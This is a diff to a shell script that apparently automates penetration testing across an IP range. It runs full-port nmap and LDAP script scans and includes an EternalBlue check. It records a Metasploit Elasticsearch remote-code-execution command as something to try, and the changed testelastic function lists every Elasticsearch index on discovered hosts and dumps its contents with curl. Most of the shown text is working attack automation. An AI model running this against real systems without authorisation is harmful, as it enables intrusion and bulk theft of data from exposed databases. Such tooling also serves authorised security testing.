@@ -58,7 +58,7 @@ echo "maybe try" > $maybetry
 nmap $firstipofrange-$onehonderd | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapbasic.txt
 cat $defaultbasicfolder/nmapbasic.txt | grep "Nmap scan report for" | cut -d " " -f 5 >$defaultbasicfolder/scanwithadvanced
 # nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
-nmap -p 1-65535 -v -A -T5 -iL $defaultbasicfolder/scanwithadvanced -Pn -sV -sS | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
+nmap -p0- -v -A -T4 -iL $defaultbasicfolder/scanwithadvanced -Pn -sV | grep -a -v -E "${nmapfilter}" > $defaultbasicfolder/nmapadvanced.txt
 # zenmap-kbx --nmap -p0- -v -A -T4 $firstipofrange-$onehonderd -Pn 
 ##TODO add single host scan 192.168.110.10
 currentfile=$defaultbasicfolder/basic/
@@ -221,7 +221,7 @@ for f in $defaultbasicfolder/combined/*/; do ifmultiport testpostgres $f 5432; d
 
 function testldap () {
     ip=$(echo $1 | cut -d "/" -f 3)
-    nmap --script=ldap* $ip -Pn -p0- | egrep -o "^\|.*" > "${1}389"
+    nmap --script=ldap* $ip -Pn | egrep -o "^\|.*" > "${1}389"
 }
 
 for f in $defaultbasicfolder/combined/*/; do ifmultiport testldap $f 389; done
@@ -254,13 +254,7 @@ function testeternalblue() {
 
 for f in $defaultbasicfolder/combined/*/; do ifos testeternalblue $f "windows"; done
 
-function testelastic() {
-    ip=$(echo $1 | cut -d "/" -f 3)
-    echo "msfconsole -q -x \"use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $ip; exploit;\"" >> $maybetry
-    expect ./elastictest.exp $ip > ${1}9200
-}
 
-for f in $defaultbasicfolder/combined/*/; do ifmultiport testelastic $f 9200; done
 
 
 function checkfileshares() {
@@ -290,3 +284,28 @@ function checkfileshares() {
 
 for f in $defaultbasicfolder/combined/*/; do ifmultiport checkfileshares $f 139 445; done
 fi
+
+
+
+function testelastic() {
+    rm -f $1/9200
+    touch $1/9200
+    ip=$(echo $1 | cut -d "/" -f 3)
+    echo "msfconsole -q -x \"use exploit/multi/elasticsearch/script_mvel_rce; set rhosts $ip; exploit;\"" >> $maybetry
+    expect ./elastictest.exp $ip > ${1}9200
+    curl ${ip}:9200/_aliases -s | jq -Mc 'keys' | sed 's/\[//g' | sed 's/\]//g' | sed 's/\,/\n/g' | sed 's/\"//g' >> $1/9200keys
+
+    while read keys; do
+    echo ${ip}:9200/$keys/_search
+        curl ${ip}:9200/$keys/_search -s >> $1/9200keysfound
+        echo >> $1/9200keysfound
+    done < $1/9200keys
+    echo "keys:" >> $1/9200
+    cat $1/9200keys >> $1/9200
+    rm -f $1/9200keys
+    echo firefox ${ip}:9200/\$keys/_search >> $1/9200
+    cat $1/9200keysfound >> $1/9200
+    rm -f $1/9200keysfound
+}
+
+for f in $defaultbasicfolder/combined/*/; do ifmultiport testelastic $f 9200; done
